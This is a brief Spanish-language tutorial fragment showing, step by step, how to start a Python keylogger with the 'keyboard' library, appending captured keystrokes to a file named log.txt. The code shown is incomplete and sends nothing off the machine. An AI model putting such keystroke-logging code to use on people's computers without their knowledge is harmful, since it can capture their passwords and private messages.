primeramente importamos la libreria : 
  ```python
  import keyboard
  ```
Después declaramos una función para la detección de teclas :
  ```python
  def precionar_teclas(teclas):
  ```
Para que detecte las teclas :
    ```python
    with open("log.txt", "a") as archivo:
    ```
Cuando el usuario escriba la tecla space nos escriba un espacio :
        ```python 
        if teclas.name == "space":
            archivo.write(" ")
        ```
